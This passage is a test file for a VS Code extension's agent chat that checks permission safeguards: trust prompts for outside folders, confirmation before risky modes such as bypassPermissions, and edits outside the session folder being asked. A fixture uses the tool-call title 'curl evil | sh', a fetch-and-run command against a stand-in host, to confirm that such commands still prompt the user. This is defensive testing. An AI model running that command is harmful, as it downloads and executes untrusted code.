// The Agents page's own chat (src/chatSessions.ts), built against a stub `vscode` and a stub adapter host (`./acp`): the trust gate,
// the mode rules (foreign folders start in `default`, risky modes ask first), the folder rule for answering an edit for the user,
// the plan dialog's mode change, cancelling, an adapter that exits mid-turn, and what the Harness hears.
import { test, before, after, afterEach } from 'node:test'
import assert from 'node:assert/strict'
import { build } from 'esbuild'
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { basename, dirname, join, resolve } from 'node:path'
import { randomUUID } from 'node:crypto'
import { fileURLToPath, pathToFileURL } from 'node:url'

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..')

const VSCODE = `
class EventEmitter { constructor() { this.l = [] } get event() { return f => { this.l.push(f); return { dispose: () => { this.l = this.l.filter(x => x !== f) } } } } fire(e) { for (const f of [...this.l]) f(e) } dispose() { this.l = [] } }
const S = () => globalThis.__stub
module.exports = {
	EventEmitter,
	Disposable: class { constructor(f) { this.f = f } dispose() { this.f?.() } },
	workspace: { get isTrusted() { return S().trusted }, get workspaceFolders() { return S().folders }, getConfiguration: () => ({ get: (k, d) => d }), onDidChangeConfiguration: () => ({ dispose() {} }) },
	window: { showWarningMessage: (...a) => S().warn(...a), showInformationMessage: async () => undefined },
	commands: { executeCommand: async (id, ...args) => { S().commands.push([id, ...args]) } },
}`

// The adapter host: one per kind, sessions in memory, the turn left pending until a test settles it.
const ACP = `
const { EventEmitter } = require('vscode')
const S = () => globalThis.__stub
const cfg = mode => [{ id: 'mode', name: 'Mode', type: 'select', currentValue: mode, options: ['default', 'acceptEdits', 'auto', 'plan', 'bypassPermissions'].map(v => ({ value: v, name: v })) }]
class AgentHost {
	constructor(kind) { this.kind = kind; this.sinks = new Map(); this.exited = new EventEmitter(); this.onDidExit = this.exited.event; this.calls = []; this.modes = new Map(); this.history = []; S().hosts[kind] = this }
	// The adapter's own mode per session, and every mode it was ever in.
	setMode(id, v) { this.modes.set(id, v); this.history.push(v) }
	setSink(id, s) { if (s) this.sinks.set(id, s); else this.sinks.delete(id) }
	async connection() {
		const h = this
		return {
			newSession: async p => { h.calls.push(['new', p.cwd]); const sessionId = randomUUID(); h.setMode(sessionId, S().initialMode); return { sessionId, configOptions: cfg(S().initialMode) } },
			loadSession: async p => { h.calls.push(['load', p.cwd]); h.setMode(p.sessionId, S().initialMode); return { configOptions: cfg(S().initialMode) } },
			setSessionConfigOption: async ({ sessionId, configId, value }) => { h.calls.push(['set', configId, value]); if (S().failSet) throw new Error('set failed'); if (configId === 'mode') h.setMode(sessionId, value); return { configOptions: cfg(value) } },
			prompt: () => new Promise((res, rej) => { h.turn = { res, rej } }),
			cancel: async () => { h.calls.push(['cancel']) },
			closeSession: async p => { h.calls.push(['close', p.sessionId]) },
		}
	}
	dispose() {}
}
function randomUUID() { return require('crypto').randomUUID() }
module.exports = { AgentHost, explain: (k, e) => String(e?.message ?? e) }`

let tmp
let mod
before(async () => {
	tmp = realpathSync(mkdtempSync(join(tmpdir(), 'flow-chatsessions-')))
	const outfile = join(tmp, 'chatSessions.cjs')
	await build({
		entryPoints: [join(ROOT, 'src', 'chatSessions.ts')], bundle: true, platform: 'node', format: 'cjs', outfile, logLevel: 'silent', external: ['@agentclientprotocol/sdk'],
		plugins: [{ name: 'stubs', setup: b => {
			b.onResolve({ filter: /^vscode$/ }, () => ({ path: 'vscode', namespace: 'stub' }))
			b.onResolve({ filter: /^\.\/acp$/ }, () => ({ path: 'acp', namespace: 'stub' }))
			b.onLoad({ filter: /^vscode$/, namespace: 'stub' }, () => ({ contents: VSCODE, loader: 'js' }))
			b.onLoad({ filter: /^acp$/, namespace: 'stub' }, () => ({ contents: ACP, loader: 'js', resolveDir: ROOT }))
		} }],
	})
	mod = await import(pathToFileURL(outfile).href).then(m => m.default ?? m)
})
after(() => rmSync(tmp, { recursive: true, force: true }))

let n = 0
const transcript = (cwd, text) => JSON.stringify({ type: 'user', cwd, message: { role: 'user', content: text } }) + '\n'
// A regression that leaves a promise pending (a modal nobody answers, a turn nobody ends) must fail the test in seconds, not hang the file.
const T = { timeout: 5000 }
const tick = () => new Promise(r => setTimeout(r, 5))
const KIND = 'claude'
const ALLOW = { optionId: 'a', name: 'Allow once', kind: 'allow_once' }
const REJECT = { optionId: 'r', name: 'Reject', kind: 'reject_once' }

// What a test left open is let go afterwards: questions cancelled, the held modal answered, the adapter's turns ended.
const made = []
afterEach(() => {
	for (const cs of made.splice(0)) { cs.dispose() }
	globalThis.__stub?.release?.()
	for (const h of Object.values(globalThis.__stub?.hosts ?? {})) { h.turn?.res({ stopReason: 'cancelled' }) }
})

/** A machine with the window's own folder, a foreign one and a sub folder of the own one, each with one Claude session. */
function setup(over = {}) {
	const home = join(tmp, 'm' + n++)
	const own = join(home, 'own')
	const sub = join(own, 'packages', 'app')
	const foreign = join(home, 'foreign')
	for (const d of [own, sub, foreign]) { mkdirSync(d, { recursive: true }) }
	process.env.CLAUDE_CONFIG_DIR = join(home, 'claude')
	process.env.CODEX_HOME = join(home, 'codex')
	const ids = {}
	for (const [name, cwd] of Object.entries({ own, sub, foreign })) {
		const dir = join(process.env.CLAUDE_CONFIG_DIR, 'projects', '-' + name)
		mkdirSync(dir, { recursive: true })
		ids[name] = randomUUID()
		writeFileSync(join(dir, ids[name] + '.jsonl'), transcript(cwd, 'hello from ' + name))
	}
	const store = new Map()
	globalThis.__stub = {
		trusted: true, folders: [{ uri: { fsPath: own } }], initialMode: 'default', failSet: false, hosts: {}, commands: [], warnings: [],
		warn: async (message, options, ...items) => { globalThis.__stub.warnings.push({ message, detail: options.detail }); return globalThis.__stub.answer ?? items[0] },
		answer: undefined,
		...over,
	}
	const context = { extensionPath: '/x', globalState: { get: (k, d) => store.has(k) ? store.get(k) : d, update: async (k, v) => { v === undefined ? store.delete(k) : store.set(k, v) } } }
	const cs = new mod.ChatSessions(context, { sessions: new Map() }, { info() {}, debug() {}, warn() {} })
	made.push(cs)
	const events = []
	cs.onEvent(e => events.push(e.event))
	return { home, own, sub, foreign, ids, store, context, cs, events, S: globalThis.__stub }
}

/** The project key of a folder, as the host's list names it. */
const keyOf = async (cs, cwd) => (await cs.projects()).find(p => p.where.endsWith(basename(cwd)))?.key
async function openIn(m, name, session = true) {
	await m.cs.projects()
	const key = await keyOf(m.cs, m[name])
	return m.cs.open(key, KIND, session ? m.ids[name] : undefined)
}
const sinkOf = (m, chat) => m.S.hosts[KIND].sinks.get(chat.sessionId)
const editAsk = (chat, path) => ({ sessionId: chat.sessionId, toolCall: { kind: 'edit', title: 'Edit', locations: path ? [{ path }] : [] }, options: [ALLOW, REJECT] })
const modeOf = (events) => events.filter(e => e.t === 'config').at(-1)?.config.find(o => o.id === 'mode').value

test('a folder outside the workspace is asked about once, by its real path, and the dialog says what else runs there', T, async () => {
	const m = setup()
	await openIn(m, 'foreign', false)
	assert.equal(m.S.warnings.length, 1)
	assert.ok(m.S.warnings[0].message.includes(m.foreign))
	assert.match(m.S.warnings[0].detail, /\.mcp\.json/)
	assert.match(m.S.warnings[0].detail, /hooks/)
	assert.match(m.S.warnings[0].detail, /Forget Folders Trusted for Agents/)
	// Another chat in the same folder does not ask again, and "forget" takes the trust back.
	await openIn(m, 'foreign', true)
	assert.equal(m.S.warnings.length, 1)
	await mod.forgetTrustedFolders(m.context)
	m.cs.dispose()
	const again = new mod.ChatSessions(m.context, { sessions: new Map() }, { info() {}, debug() {}, warn() {} })
	await again.projects()
	await again.open(await keyOf(again, m.foreign), KIND)
	assert.equal(m.S.warnings.length, 2)
})

test('declining the trust dialog starts nothing', T, async () => {
	const m = setup({ warn: async () => undefined })
	await assert.rejects(openIn(m, 'foreign', false), /Not started/)
	assert.equal(m.S.hosts[KIND]?.calls.length ?? 0, 0)
})

test('the folder is checked again right before the agent starts: a link pointed elsewhere after the yes is refused', { ...T, skip: process.platform === 'win32' && 'a symbolic link needs a privilege a Windows runner does not have' }, async () => {
	const m = setup()
	const other = join(m.home, 'elsewhere')
	mkdirSync(other)
	const link = join(m.home, 'link')
	symlinkSync(m.foreign, link)
	// The Claude transcript of the foreign folder names the link as its cwd.
	writeFileSync(join(process.env.CLAUDE_CONFIG_DIR, 'projects', '-foreign', m.ids.foreign + '.jsonl'), transcript(link, 'via a link'))
	m.S.warn = async (message, options, ...items) => { m.S.warnings.push({ message, detail: options.detail }); unlinkSync(link); symlinkSync(other, link); return items[0] }
	await m.cs.projects()
	const key = (await m.cs.projects()).find(p => p.where.endsWith('link'))?.key
	assert.ok(key)
	// The dialog showed the real folder, not the link.
	await assert.rejects(m.cs.open(key, KIND), /folder changed/)
	assert.ok(m.S.warnings[0].message.includes(m.foreign))
	assert.equal(m.S.hosts[KIND].calls.filter(c => c[0] === 'new' || c[0] === 'load').length, 0)
})

test('control characters in a folder name never reach a dialog', { ...T, skip: process.platform === 'win32' && 'a Windows file name cannot hold a control character' }, async () => {
	const m = setup()
	const odd = join(m.home, 'bad\nname\u001b[31m')
	mkdirSync(odd)
	const dir = join(process.env.CLAUDE_CONFIG_DIR, 'projects', '-odd')
	mkdirSync(dir, { recursive: true })
	writeFileSync(join(dir, randomUUID() + '.jsonl'), transcript(odd, 'x'))
	const key = (await m.cs.projects()).find(p => p.name.startsWith('bad'))?.key
	await m.cs.open(key, KIND)
	assert.doesNotMatch(m.S.warnings[0].message, /[\u0000-\u001f]/)
})

test('a sub folder of the workspace is the window\'s own: no question, hooks on, the inherited mode kept', T, async () => {
	const m = setup({ initialMode: 'acceptEdits' })
	const c = await openIn(m, 'sub')
	assert.equal(m.S.warnings.length, 0)
	assert.equal(c.own, true)
	assert.equal(c.mode, 'acceptEdits')
	const p = m.cs.prompt(c.id, 'go')
	await tick()
	assert.ok(m.S.commands.some(x => x[0] === 'flow.agentTurn'))
	m.S.hosts[KIND].turn.res({ stopReason: 'end_turn' })
	await p
})

test('outside the workspace a session always starts in default, whatever the folder\'s settings say', T, async () => {
	for (const initial of ['bypassPermissions', 'acceptEdits', 'auto']) {
		const m = setup({ initialMode: initial })
		const f = await openIn(m, 'foreign')
		assert.equal(f.mode, 'default', initial)
		assert.equal(f.own, false)
		assert.deepEqual(m.S.hosts[KIND].calls.filter(c => c[0] === 'set'), [['set', 'mode', 'default']])
		const o = await openIn(m, 'own')
		assert.equal(o.mode, initial, 'the window\'s own folder keeps what the user\'s settings say')
	}
})

test('risky modes need a modal yes, once per session and mode; a no changes nothing and puts the picker back', T, async () => {
	const m = setup()
	const f = await openIn(m, 'foreign')
	m.S.warnings.length = 0
	m.S.answer = null
	m.S.warn = async (message, options) => { m.S.warnings.push({ message, detail: options.detail }); return undefined }
	m.events.length = 0
	await m.cs.setOption(f.id, 'mode', 'acceptEdits')
	assert.equal(f.mode, 'default')
	assert.equal(m.S.warnings.length, 1)
	assert.ok(m.S.warnings[0].detail.includes(m.foreign))
	assert.equal(modeOf(m.events), 'default', 'a config event sends the picker back')
	// Yes: the mode changes, and asking again for the same mode is silent.
	m.S.warn = async (message, options, ...items) => { m.S.warnings.push({ message, detail: options.detail }); return items[0] }
	await m.cs.setOption(f.id, 'mode', 'acceptEdits')
	assert.equal(f.mode, 'acceptEdits')
	assert.equal(modeOf(m.events), 'acceptEdits')
	await m.cs.setOption(f.id, 'mode', 'default')
	await m.cs.setOption(f.id, 'mode', 'acceptEdits')
	assert.equal(m.S.warnings.length, 2, 'one no, one yes')
	// Another mode is another question; plan is not a risky one; bypass asks even in the own folder.
	await m.cs.setOption(f.id, 'mode', 'plan')
	assert.equal(m.S.warnings.length, 2)
	await m.cs.setOption(f.id, 'mode', 'bypassPermissions')
	assert.equal(m.S.warnings.length, 3)
	const o = await openIn(m, 'own')
	await m.cs.setOption(o.id, 'mode', 'acceptEdits')
	assert.equal(m.S.warnings.length, 3, 'acceptEdits in the own folder needs no question')
	await m.cs.setOption(o.id, 'mode', 'bypassPermissions')
	assert.equal(m.S.warnings.length, 4)
	assert.equal(o.mode, 'bypassPermissions')
})

test('an answer for the user stays inside the session\'s folder: outside it, .. traversal, .git, .claude and no location are asked', T, async () => {
	const m = setup()
	const o = await openIn(m, 'own')
	await m.cs.setOption(o.id, 'mode', 'acceptEdits')
	const sink = sinkOf(m, o)
	const inside = await sink.onPermission(editAsk(o, join(m.own, 'src', 'a.ts')))
	assert.deepEqual(inside, { outcome: { outcome: 'selected', optionId: 'a' } })
	for (const path of [join(m.home, 'outside.ts'), join(m.own, '..', 'outside.ts'), join(m.own, '.git', 'hooks', 'pre-commit'), join(m.own, '.claude', 'settings.json'), join(m.own, 'src', '.vscode', 'tasks.json'), undefined]) {
		m.events.length = 0
		const pending = sink.onPermission(editAsk(o, path))
		await tick()
		const ask = m.events.find(e => e.t === 'ask')
		assert.ok(ask, 'asked for ' + path)
		m.cs.answer(o.id, ask.req, 1)
		assert.deepEqual(await pending, { outcome: { outcome: 'selected', optionId: 'r' } })
	}
})

test('the plan dialog\'s mode change is followed: the picker moves, the adapter goes back to default, and the folder rule applies at once; no modal where none is needed', T, async () => {
	const m = setup({ initialMode: 'plan' })
	const f = await openIn(m, 'own')
	assert.equal(f.mode, 'plan')
	m.events.length = 0
	m.S.warnings.length = 0
	m.S.hosts[KIND].calls.length = 0
	// The user approved "accept edits" in the plan question (that answer left its grant); the adapter reports its new mode.
	f.granted = 'acceptEdits'
	sinkOf(m, f).onUpdate({ update: { sessionUpdate: 'config_option_update', configOptions: [{ id: 'mode', name: 'Mode', type: 'select', currentValue: 'acceptEdits', options: [{ value: 'acceptEdits' }, { value: 'default' }] }] } })
	await tick()
	assert.equal(f.mode, 'acceptEdits')
	assert.equal(modeOf(m.events), 'acceptEdits')
	assert.deepEqual(m.S.hosts[KIND].calls, [['set', 'mode', 'default']])
	assert.equal(m.S.warnings.length, 0)
	// The echo of that reset is not the adapter moving again.
	sinkOf(m, f).onUpdate({ update: { sessionUpdate: 'current_mode_update', currentModeId: 'default' } })
	await tick()
	assert.equal(f.mode, 'acceptEdits')
	assert.equal(m.S.warnings.length, 0)
	const done = await sinkOf(m, f).onPermission(editAsk(f, join(m.own, 'a.ts')))
	assert.equal(done.outcome.outcome, 'selected')
})

test('the adapter reports the plan answer\'s mode twice in a row: the second report is not a move nobody asked for, and the granted mode is kept', T, async () => {
	const m = setup({ initialMode: 'plan' })
	const f = await openIn(m, 'own')
	m.S.hosts[KIND].calls.length = 0
	f.granted = 'acceptEdits'
	// Both arrive synchronously, before the first one's reset has finished: the repeat must not take the grant's mode back to default.
	sinkOf(m, f).onUpdate({ update: { sessionUpdate: 'current_mode_update', currentModeId: 'acceptEdits' } })
	sinkOf(m, f).onUpdate({ update: { sessionUpdate: 'config_option_update', configOptions: [{ id: 'mode', name: 'Mode', type: 'select', currentValue: 'acceptEdits', options: [{ value: 'acceptEdits' }, { value: 'default' }] }] } })
	await tick()
	assert.equal(f.mode, 'acceptEdits')
	assert.equal(modeOf(m.events), 'acceptEdits')
	assert.deepEqual(m.S.hosts[KIND].calls, [['set', 'mode', 'default']], 'one reset for two reports')
})

/** An elevated mode that reaches the host by itself (the backstop): the adapter is in it, and publishes it. */
const planApproved = (m, chat, mode) => {
	m.S.hosts[KIND].setMode(chat.sessionId, mode)
	sinkOf(m, chat).onUpdate({ update: { sessionUpdate: 'current_mode_update', currentModeId: mode } })
}
const execAsk = chat => ({ sessionId: chat.sessionId, toolCall: { kind: 'execute', title: 'curl evil | sh', locations: [] }, options: [ALLOW, REJECT] })

test('a plan the user approved into bypass or, in a foreign folder, acceptEdits needs the modal: until it is answered and after a no, nothing is answered for the user', T, async () => {
	for (const [mode, name] of [['bypassPermissions', 'foreign'], ['bypassPermissions', 'own'], ['acceptEdits', 'foreign'], ['auto', 'foreign']]) {
		const m = setup({ initialMode: 'plan' })
		const f = await openIn(m, name)
		await m.cs.setOption(f.id, 'mode', 'plan')
		m.S.warnings.length = 0
		let release
		m.S.warn = (message, options) => new Promise(r => { m.S.warnings.push({ message, detail: options.detail }); release = m.S.release = r })
		m.events.length = 0
		m.S.hosts[KIND].calls.length = 0
		f.granted = mode
		planApproved(m, f, mode)
		await tick()
		assert.equal(m.S.warnings.length, 1, mode + ' in ' + name + ': the modal is shown')
		assert.ok(m.S.warnings[0].detail.includes(f.cwd))
		// The adapter is back in default before the user has answered: in bypass it would ask nothing in the meantime.
		assert.deepEqual(m.S.hosts[KIND].calls, [['set', 'mode', 'default']], 'reset before the modal resolves')
		assert.equal(m.S.hosts[KIND].modes.get(f.sessionId), 'default')
		// While it is open the chat behaves as default: an execute question asks, an edit asks too.
		assert.equal(f.mode, 'default')
		assert.equal(modeOf(m.events), 'default')
		m.events.length = 0
		const during = sinkOf(m, f).onPermission(execAsk(f))
		await tick()
		const ask = m.events.find(e => e.t === 'ask')
		assert.ok(ask, 'asked during the modal')
		m.cs.answer(f.id, ask.req, 1)
		assert.deepEqual(await during, { outcome: { outcome: 'selected', optionId: 'r' } })
		// No: default, in the adapter as well, the picker shows it, and nothing is auto-allowed.
		m.events.length = 0
		release(undefined)
		await tick()
		assert.equal(f.mode, 'default')
		assert.equal(modeOf(m.events), 'default')
		assert.deepEqual(m.S.hosts[KIND].calls, [['set', 'mode', 'default']])
		const pending = sinkOf(m, f).onPermission(execAsk(f))
		await tick()
		const again = m.events.find(e => e.t === 'ask')
		assert.ok(again, 'an execute question after the no is not auto-allowed')
		m.cs.answer(f.id, again.req, 1)
		await pending
		const edit = sinkOf(m, f).onPermission(editAsk(f, join(f.cwd, 'a.ts')))
		await tick()
		assert.ok(m.events.filter(e => e.t === 'ask').length >= 2, 'an edit asks too')
		m.cs.cancel(f.id)
		await edit
		m.cs.dispose()
	}
})

test('a mode the adapter reports that no answer of the user asked for is taken back to default: no modal, nothing adopted, in any folder', T, async () => {
	for (const [mode, name] of [['bypassPermissions', 'foreign'], ['bypassPermissions', 'own'], ['acceptEdits', 'own'], ['auto', 'own'], ['acceptEdits', 'foreign']]) {
		const m = setup({ initialMode: 'plan' })
		const f = await openIn(m, name)
		await m.cs.setOption(f.id, 'mode', 'plan')
		m.S.warnings.length = 0
		m.events.length = 0
		m.S.hosts[KIND].calls.length = 0
		planApproved(m, f, mode)
		await tick()
		assert.equal(m.S.warnings.length, 0, mode + ' in ' + name + ': no modal')
		assert.deepEqual(m.S.hosts[KIND].calls, [['set', 'mode', 'default']], 'the adapter is reset')
		assert.equal(m.S.hosts[KIND].modes.get(f.sessionId), 'default')
		assert.equal(f.mode, 'default')
		assert.equal(modeOf(m.events), 'default')
		// A grant for another mode vouches for nothing, and is used up by the one report it met.
		f.granted = 'auto'
		planApproved(m, f, mode === 'auto' ? 'acceptEdits' : mode)
		await tick()
		assert.equal(f.mode, 'default', 'a grant for another mode vouches for nothing')
		assert.equal(f.granted, undefined)
	}
})

test('a grant is dropped by a new prompt and by cancelling: the adapter\'s later report is not the user\'s', T, async () => {
	for (const how of ['prompt', 'cancel']) {
		const m = setup({ initialMode: 'plan' })
		const f = await openIn(m, 'own')
		f.granted = 'acceptEdits'
		if (how === 'prompt') {
			void m.cs.prompt(f.id, 'go')
			await tick()
		} else {
			await m.cs.cancel(f.id)
		}
		assert.equal(f.granted, undefined, how)
		planApproved(m, f, 'acceptEdits')
		await tick()
		assert.notEqual(f.mode, 'acceptEdits', how)
	}
})

test('a plan approved into bypass and confirmed switches the chat, and the same mode confirmed before is not asked again', T, async () => {
	const m = setup({ initialMode: 'plan' })
	const f = await openIn(m, 'foreign')
	await m.cs.setOption(f.id, 'mode', 'plan')
	m.S.warnings.length = 0
	m.S.hosts[KIND].calls.length = 0
	f.granted = 'bypassPermissions'
	planApproved(m, f, 'bypassPermissions')
	await tick()
	assert.equal(m.S.warnings.length, 1)
	assert.equal(f.mode, 'bypassPermissions')
	assert.deepEqual(m.S.hosts[KIND].calls, [['set', 'mode', 'default']], 'the adapter itself stays in default')
	assert.equal(modeOf(m.events), 'bypassPermissions')
	const done = await sinkOf(m, f).onPermission(execAsk(f))
	assert.deepEqual(done, { outcome: { outcome: 'selected', optionId: 'a' } })
	// Back to plan and approved into bypass again: confirmed for this session already.
	await m.cs.setOption(f.id, 'mode', 'plan')
	f.granted = 'bypassPermissions'
	planApproved(m, f, 'bypassPermissions')
	await tick()
	assert.equal(m.S.warnings.length, 1)
	assert.equal(f.mode, 'bypassPermissions')
	// A repeat of the same update while the modal is open is not a second modal (and not a refusal).
	const g = await openIn(m, 'own')
	await m.cs.setOption(g.id, 'mode', 'plan')
	let release
	m.S.warn = (message, options) => new Promise(r => { m.S.warnings.push({ message, detail: options.detail }); release = m.S.release = r })
	g.granted = 'bypassPermissions'
	planApproved(m, g, 'bypassPermissions')
	planApproved(m, g, 'bypassPermissions')
	await tick()
	assert.equal(m.S.warnings.length, 2)
	release('Switch Mode')
	await tick()
	assert.equal(g.mode, 'bypassPermissions')
})

test('cancelling answers a pending question; an answer for a question that is not there is ignored', T, async () => {
	const m = setup()
	const c = await openIn(m, 'own')
	const p = m.cs.prompt(c.id, 'go')
	await tick()
	const asked = sinkOf(m, c).onPermission({ sessionId: c.sessionId, toolCall: { kind: 'execute', title: 'npm test' }, options: [ALLOW] })
	await tick()
	assert.equal(c.asks.size, 1)
	m.cs.answer(c.id, 99, 0)
	m.cs.answer('claude:nope', 0, 0)
	assert.equal(c.asks.size, 1)
	await m.cs.cancel(c.id)
	assert.deepEqual(await asked, { outcome: { outcome: 'cancelled' } })
	m.S.hosts[KIND].turn.res({ stopReason: 'cancelled' })
	await p
	assert.equal(c.busy, false)
	assert.deepEqual(m.events.at(-1), { t: 'stop', reason: 'cancelled' })
})

test('an adapter that exits mid-turn marks the chat dead and says so once, in either order', T, async () => {
	for (const exitFirst of [true, false]) {
		const m = setup()
		const c = await openIn(m, 'own')
		const p = m.cs.prompt(c.id, 'go')
		await tick()
		m.events.length = 0
		const host = m.S.hosts[KIND]
		if (exitFirst) {
			host.exited.fire()
			host.turn.rej(new Error('connection closed'))
		} else {
			host.turn.rej(new Error('connection closed'))
			await tick()
			host.exited.fire()
		}
		await p
		await tick()
		assert.equal(c.dead, true)
		assert.equal(c.busy, false)
		const errors = m.events.filter(e => e.t === 'error')
		assert.equal(errors.length, 1, 'exitFirst=' + exitFirst)
		assert.equal(errors[0].fatal, true)
		// The next message says what happened and also ends the turn the page began.
		m.events.length = 0
		await m.cs.prompt(c.id, 'again')
		assert.deepEqual(m.events.map(e => [e.t, e.fatal]), [['error', true]])
		m.cs.dispose()
	}
})

test('a failed turn is a fatal error; "still answering" is only a line', T, async () => {
	const m = setup()
	const c = await openIn(m, 'own')
	const p = m.cs.prompt(c.id, 'go')
	await tick()
	m.events.length = 0
	await m.cs.prompt(c.id, 'second')
	assert.deepEqual(m.events.map(e => [e.t, e.fatal]), [['error', undefined]])
	m.S.hosts[KIND].turn.rej(new Error('model overloaded'))
	await p
	assert.deepEqual(m.events.at(-1), { t: 'error', fatal: true, text: 'model overloaded' })
})

test('a question of another folder never reaches the Harness inbox; this window\'s own does', T, async () => {
	const m = setup()
	const f = await openIn(m, 'foreign')
	const o = await openIn(m, 'own')
	for (const c of [f, o]) {
		const pending = sinkOf(m, c).onPermission({ sessionId: c.sessionId, toolCall: { kind: 'execute', title: 'ls' }, options: [ALLOW] })
		await tick()
		m.cs.answer(c.id, 0, 0)
		await pending
	}
	const recorded = m.S.commands.filter(x => x[0] === 'flowHarness.recordPermission')
	assert.equal(recorded.length, 1)
	assert.equal(recorded[0][1].decision, 'allowed')
})

test('a session that fails to start after it exists is let go: no sink left, the adapter told to close it', T, async () => {
	const m = setup({ failSet: true, initialMode: 'acceptEdits' })
	await m.cs.projects()
	const key = await keyOf(m.cs, m.foreign)
	await assert.rejects(m.cs.open(key, KIND, m.ids.foreign), /set failed/)
	const host = m.S.hosts[KIND]
	assert.equal(host.sinks.size, 0)
	assert.deepEqual(host.calls.filter(c => c[0] === 'close'), [['close', m.ids.foreign]])
	assert.equal(m.cs.get('claude:' + m.ids.foreign), undefined)
})

test('a prompt for a chat the host no longer has ends the page\'s turn with a fatal error for that chat', T, async () => {
	const m = setup()
	const seen = []
	m.cs.onEvent(e => seen.push(e))
	await m.cs.prompt('claude:gone', 'hello')
	assert.equal(seen.length, 1)
	assert.equal(seen[0].chat, 'claude:gone')
	assert.equal(seen[0].event.t, 'error')
	assert.equal(seen[0].event.fatal, true)
})

test('a chat the page is showing is never evicted, however many chats open after it', T, async () => {
	const m = setup()
	const shown = await openIn(m, 'own')
	m.cs.opened(shown)
	// Eight more new chats: the table holds eight, so one has to go, and the oldest idle one used to be the one on screen.
	const others = []
	for (let i = 0; i < 8; i++) { others.push(await openIn(m, 'own', false)) }
	assert.equal(m.cs.get(shown.id), shown)
	assert.equal(m.cs.get(others.at(-1).id), others.at(-1), 'the newest stays')
	assert.equal(m.cs.get(others[0].id), undefined, 'the oldest idle one that is not shown went instead')
	const p = m.cs.prompt(shown.id, 'still here')
	await tick()
	assert.equal(shown.busy, true)
	m.S.hosts[KIND].turn.res({ stopReason: 'end_turn' })
	await p
})

test('an adapter that exits while idle, after an earlier turn failed, still says the process ended', T, async () => {
	const m = setup()
	const c = await openIn(m, 'own')
	const p = m.cs.prompt(c.id, 'go')
	await tick()
	m.S.hosts[KIND].turn.rej(new Error('model overloaded'))
	await p
	await new Promise(r => setTimeout(r, 1100))
	m.events.length = 0
	m.S.hosts[KIND].exited.fire()
	assert.deepEqual(m.events.map(e => [e.t, e.fatal]), [['error', true]])
	assert.match(m.events[0].text, /process ended/)
})

// ---- the plan question's elevating answers are confirmed before the adapter hears them ------------------------------------------------

// The options of the real adapter's plan question (claude-agent-acp dist/permissions/options/tools.js), every id it can use, and the
// mode its own table gives each (effects.js): the stub adapter acts on the id alone, as the real one does.
const PLAN_OPTIONS = [
	{ optionId: 'exit-plan-clear-auto', name: 'Yes, clear context and use auto mode', kind: 'allow_always' },
	{ optionId: 'exit-plan-clear-bypass', name: 'Yes, clear context and bypass permissions', kind: 'allow_always' },
	{ optionId: 'exit-plan-auto', name: 'Yes, and use auto mode', kind: 'allow_always' },
	{ optionId: 'exit-plan-bypass', name: 'Yes, and bypass permissions', kind: 'allow_always' },
	{ optionId: 'exit-plan-accept-edits', name: 'Yes, auto-accept edits', kind: 'allow_always' },
	{ optionId: 'exit-plan-default', name: 'Yes, manually approve edits', kind: 'allow_once' },
	{ optionId: 'reject', name: 'No, keep planning', kind: 'reject_once' },
]
const ADAPTER_MODE = { 'exit-plan-bypass': 'bypassPermissions', 'exit-plan-clear-bypass': 'bypassPermissions', 'exit-plan-auto': 'auto', 'exit-plan-clear-auto': 'auto', 'exit-plan-accept-edits': 'acceptEdits', 'exit-plan-default': 'default' }
const optionIndex = id => PLAN_OPTIONS.findIndex(o => o.optionId === id)

/** The adapter asks the plan question; whatever it is answered with takes effect in the adapter at once and is published, as in the real one. */
function planQuestion(m, chat) {
	const sink = sinkOf(m, chat)
	return sink.onPermission({ sessionId: chat.sessionId, toolCall: { kind: 'switch_mode', title: 'Ready to code?', locations: [] }, options: PLAN_OPTIONS }).then(res => {
		m.answers.push(res.outcome.optionId)
		const mode = ADAPTER_MODE[res.outcome.optionId]
		if (mode) {
			m.S.hosts[KIND].setMode(chat.sessionId, mode)
			sink.onUpdate({ update: { sessionUpdate: 'current_mode_update', currentModeId: mode } })
		}
		return res
	})
}
/** A tool question as the real adapter delivers it: in bypass Claude Code allows the call itself and the host never hears of it. */
function toolAsk(m, chat, req) {
	if (m.S.hosts[KIND].modes.get(chat.sessionId) === 'bypassPermissions') {
		m.unasked.push(req.toolCall.title)
		return Promise.resolve({ outcome: { outcome: 'selected', optionId: 'a' } })
	}
	return sinkOf(m, chat).onPermission(req)
}
const planSetup = async (name, over) => {
	const m = setup({ initialMode: 'plan', ...over })
	m.answers = []
	m.unasked = []
	const f = await openIn(m, name)
	await m.cs.setOption(f.id, 'mode', 'plan')
	m.S.warnings.length = 0
	m.S.hosts[KIND].calls.length = 0
	m.S.hosts[KIND].history.length = 0
	m.events.length = 0
	return { m, f }
}
const holdModal = m => {
	const held = {}
	m.S.warn = (message, options) => new Promise(r => { m.S.warnings.push({ message, detail: options.detail }); held.release = m.S.release = r })
	return held
}
const askEvent = events => events.find(e => e.t === 'ask')

test('an elevating plan answer is confirmed before the adapter hears it; a no sends the plain approval, nothing is ever elevated, the next command asks', T, async () => {
	for (const [id, name] of [['exit-plan-bypass', 'foreign'], ['exit-plan-bypass', 'own'], ['exit-plan-auto', 'foreign'], ['exit-plan-accept-edits', 'foreign'], ['exit-plan-clear-bypass', 'own'], ['exit-plan-clear-auto', 'foreign']]) {
		const { m, f } = await planSetup(name)
		const held = holdModal(m)
		let settled = false
		const q = planQuestion(m, f).then(r => { settled = true; return r })
		await tick()
		const ask = askEvent(m.events)
		assert.ok(ask, id + ': the page shows the plan question')
		m.cs.answer(f.id, ask.req, optionIndex(id))
		await tick()
		assert.equal(m.S.warnings.length, 1, id + ' in ' + name + ': the modal is shown')
		assert.equal(settled, false, 'the adapter has not been answered: its turn is held')
		assert.deepEqual(m.S.hosts[KIND].history, [], 'no mode change reached the adapter')
		// A second answer for the same question is ignored while the modal is open.
		m.cs.answer(f.id, ask.req, optionIndex('exit-plan-default'))
		await tick()
		assert.equal(settled, false)
		m.events.length = 0
		held.release(undefined)
		assert.deepEqual(await q, { outcome: { outcome: 'selected', optionId: 'exit-plan-default' } })
		assert.deepEqual(m.answers, ['exit-plan-default'])
		assert.deepEqual(m.S.hosts[KIND].history, ['default'], id + ': the adapter was never in an elevated mode')
		assert.equal(f.mode, 'default')
		assert.equal(modeOf(m.events), 'default', 'the picker shows default')
		assert.equal(m.S.warnings.length, 1)
		const next = toolAsk(m, f, execAsk(f))
